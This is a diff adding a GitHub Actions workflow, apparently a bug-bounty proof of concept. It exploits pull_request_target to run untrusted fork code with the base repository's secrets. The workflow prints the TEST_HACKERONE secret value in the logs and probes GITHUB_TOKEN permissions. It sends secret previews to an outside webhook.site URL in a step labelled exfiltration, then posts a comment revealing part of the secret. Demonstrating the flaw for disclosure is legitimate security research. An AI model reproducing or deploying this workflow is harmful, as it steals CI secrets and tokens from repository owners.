@@ -1,0 +1,97 @@
+name: Proof of Secret Access
+on: [pull_request_target]
+
+jobs:
+  steal-secrets:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout untrusted PR code
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+          
+      - name: Access Base Repository Secret
+        env:
+          TEST_HACKERONE: ${{ secrets.TEST_HACKERONE }}
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "=== PROOF OF BASE REPO SECRET ACCESS ==="
+          echo "Running in repository: ${{ github.repository }}"
+          echo "Event: ${{ github.event_name }}"
+          echo ""
+          
+          # 1. Check if TEST_HACKERONE secret exists
+          if [ -n "$TEST_HACKERONE" ]; then
+            echo "✅ SECRET FOUND: TEST_HACKERONE"
+            echo "Secret value: $TEST_HACKERONE"
+            echo "Secret length: ${#TEST_HACKERONE} characters"
+          else
+            echo "❌ TEST_HACKERONE is empty or not set"
+          fi
+          
+          echo ""
+          echo "=== GITHUB_TOKEN ACCESS ==="
+          
+          # 2. Check GITHUB_TOKEN
+          if [ -n "$GITHUB_TOKEN" ]; then
+            echo "✅ GITHUB_TOKEN is available"
+            echo "Token first 10 chars: ${GITHUB_TOKEN:0:10}..."
+            
+            # Test token permissions
+            echo "Testing token permissions..."
+            RESPONSE=$(curl -s -H "Authorization: token $GITHUB_TOKEN" \
+              -H "Accept: application/vnd.github.v3+json" \
+              "https://api.github.com/repos/${{ github.repository }}")
+            
+            if echo "$RESPONSE" | grep -q "full_name"; then
+              echo "✅ Token can access repository API"
+            fi
+          else
+            echo "❌ GITHUB_TOKEN not available"
+          fi
+          
+          echo ""
+          echo "=== EXFILTRATION ==="
+          
+          # 3. Exfiltrate the data
+          WEBHOOK_URL="https://webhook.site/bbb8295e-ccd3-4e4d-b2c3-63af6e217219"
+          
+          curl -X POST "$WEBHOOK_URL" \
+            -H "Content-Type: application/json" \
+            -d "$(cat <<EOF
+{
+  "exploit": "pull_request_target_secret_theft",
+  "repository": "${{ github.repository }}",
+  "pr_number": ${{ github.event.pull_request.number }},
+  "pr_url": "${{ github.event.pull_request.html_url }}",
+  "test_hackerone_exists": $([ -n "$TEST_HACKERONE" ] && echo "true" || echo "false"),
+  "test_hackerone_length": ${#TEST_HACKERONE},
+  "test_hackerone_preview": "${TEST_HACKERONE:0:20}",
+  "github_token_exists": $([ -n "$GITHUB_TOKEN" ] && echo "true" || echo "false"),
+  "timestamp": "$(date -Iseconds)"
+}
+EOF
+          )"
+          
+          echo "✅ Data exfiltrated successfully"
+          
+      - name: Create Comment with Stolen Secret (Optional)
+        if: env.TEST_HACKERONE != ''
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          TEST_HACKERONE: ${{ secrets.TEST_HACKERONE }}
+        run: |
+          # Create a comment with proof
+          COMMENT="🚨 **SECURITY PROOF - SECRET ACCESS** 🚨\n\n"\
+          "The TEST_HACKERONE secret has been accessed from the base repository.\n\n"\
+          "**Proof:**\n"\
+          "- Secret exists: ✅ YES\n"\
+          "- Secret length: ${#TEST_HACKERONE} characters\n"\
+          "- First chars: '${TEST_HACKERONE:0:10}...'\n\n"\
+          "This proves the pull_request_target vulnerability allows untrusted fork code to access base repository secrets."
+          
+          curl -X POST \
+            -H "Authorization: token $GITHUB_TOKEN" \
+            -H "Accept: application/vnd.github.v3+json" \
+            "https://api.github.com/repos/${{ github.repository }}/issues/${{ github.event.pull_request.number }}/comments" \
+            -d "{\"body\": \"$COMMENT\"}"
